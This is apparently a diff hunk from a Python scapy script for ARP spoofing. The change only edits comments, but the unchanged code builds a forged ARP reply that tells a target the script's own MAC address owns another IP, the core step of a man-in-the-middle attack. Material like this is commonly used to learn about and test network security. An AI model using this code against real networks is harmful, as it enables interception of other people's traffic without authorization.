@@ -40,9 +40,9 @@ def spoofed_packet(targetIP_1, targetIP_2):
 
     #Creates a packet to spoofed_packet a target that we are the gateway IP
     #pdst=destination IP (of our target)
-    #hwdst=destination MAC (of out target)
+    #hwdst=destination MAC (of our target; pulled from get_mac)
     #prsc=projected source (what we're telling this target our fake IP is)
-        #reassociates MAC address in target's table for this IP to our MAC
+    #reassociates MAC address in target's table for this IP to our MAC
     packet = scapy.ARP(op=2, pdst=targetIP_1, hwdst=mac, psrc=targetIP_2)
 
     return packet
